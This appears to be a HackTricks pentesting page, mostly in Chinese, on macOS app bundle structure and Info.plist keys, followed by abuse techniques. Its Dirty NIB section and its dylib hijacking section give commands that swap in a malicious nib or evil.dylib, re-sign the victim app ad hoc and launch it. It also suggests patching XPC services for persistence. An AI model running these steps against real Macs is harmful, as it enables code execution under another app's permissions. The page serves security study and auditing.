# macOS 捆绑包

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

在 macOS 中，捆绑包（Bundles）作为容器，包含应用程序、库和其他必要的文件，使它们在 Finder 中显示为单个对象，例如熟悉的 `*.app` 文件。最常见的捆绑包是 `.app` 类型，尽管像 `.framework`、`.systemextension` 和 `.kext` 等其他类型也很常见。

### 捆绑包的主要组成部分

在捆绑包中，尤其是在 `<application>.app/Contents/` 目录内，包含各种重要资源：

- **\_CodeSignature**: 该目录存储用于验证应用完整性的代码签名详情。你可以使用类似如下的命令检查代码签名信息：
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: 包含在用户交互时运行的应用可执行二进制文件。
- **Resources**: 存放应用界面组件的仓库，包括图片、文档和界面描述文件（nib/xib files）。
- **Info.plist**: 作为应用的主配置文件，对系统识别和正确交互应用至关重要。

#### Important Keys in Info.plist

`Info.plist` 文件是应用配置的基石，包含诸如以下键：

- **CFBundleExecutable**: 指定位于 `Contents/MacOS` 目录下主可执行文件的名称。
- **CFBundleIdentifier**: 为应用提供全局标识符，macOS 在应用管理中广泛使用。
- **LSMinimumSystemVersion**: 指示运行该应用所需的最低 macOS 版本。

### Exploring Bundles

要查看一个 bundle（例如 `Safari.app`）的内容，可以使用以下命令：`bash ls -lR /Applications/Safari.app/Contents`

此操作会显示诸如 `_CodeSignature`、`MacOS`、`Resources` 等目录以及 `Info.plist` 等文件，它们分别负责从保护应用到定义其用户界面和运行参数等不同功能。

#### Additional Bundle Directories

除了常见目录外，bundle 还可能包含：

- **Frameworks**: 包含应用使用的捆绑 frameworks。Frameworks 类似于 dylibs，但带有额外资源。
- **PlugIns**: 放置增强应用功能的 plug-ins 和扩展的目录。
- **XPCServices**: 存放应用用于进程外通信的 XPC services。

这种结构确保所有必要组件都封装在 bundle 内，便于模块化和安全的应用环境。

For more detailed information on `Info.plist` keys and their meanings, the Apple developer documentation provides extensive resources: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: 当被 quarantine 的 bundle 首次执行时，macOS 会进行深度签名验证，并可能从随机的 translocated 路径运行它。一旦被接受，后续启动仅执行浅层检查；历史上 `Resources/`、`PlugIns/`、nibs 等资源文件未被严格检查。自 macOS 13 Ventura 起，首次运行会强制执行深度检查，并且新的 *App Management* TCC 权限阻止第三方进程在未经用户同意的情况下修改其他 bundles，但旧系统仍然存在易受攻击的情况。
- **Bundle Identifier collisions**: 多个嵌入目标（PlugIns、helper tools）重复使用相同的 `CFBundleIdentifier` 会破坏签名验证并有时导致 URL‑scheme 劫持/混淆。始终枚举子 bundle 并核实唯一 ID。

## Resource Hijacking (Dirty NIB / NIB Injection)

在 Ventura 之前，更换已签名应用的 UI 资源可以绕过浅层代码签名并利用应用的权限获得代码执行。当前研究（2024）显示这在 pre‑Ventura 和未被 quarantine 的构建上仍然有效：

1. 将目标应用复制到可写位置（例如 `/tmp/Victim.app`）。
2. 用恶意的 nib 替换 `Contents/Resources/MainMenu.nib`（或任何在 `NSMainNibFile` 中声明的 nib），该 nib 实例化 `NSAppleScript`、`NSTask` 等。
3. 启动应用。恶意 nib 在受害者的 bundle ID 和权限（TCC 授权、麦克风/摄像头等）下执行。
4. Ventura+ 通过在首次启动时进行深度验证并要求后续修改需要 *App Management* 权限来缓解，因此持久化更难，但对旧版 macOS 的首次启动攻击仍然适用。

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundles 内的 Framework / PlugIn / dylib 劫持

因为 `@rpath` 查找优先使用捆绑的 Frameworks/PlugIns，将恶意库放入 `Contents/Frameworks/` 或 `Contents/PlugIns/` 内可以在主二进制未启用库验证或 `LC_RPATH` 排序薄弱时重定向加载顺序。

在滥用未签名/临时签名 (ad‑hoc) bundle 时的典型步骤：
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
注意：
- Hardened runtime 在缺少 `com.apple.security.cs.disable-library-validation` 时会阻止第三方 dylibs；请先检查 entitlements。
- 位于 `Contents/XPCServices/` 下的 XPC services 通常会加载同级 frameworks—应以类似方式 patch 其 binaries，以实现 persistence 或 privilege escalation 路径。

## 快速检查速查表
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## References

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
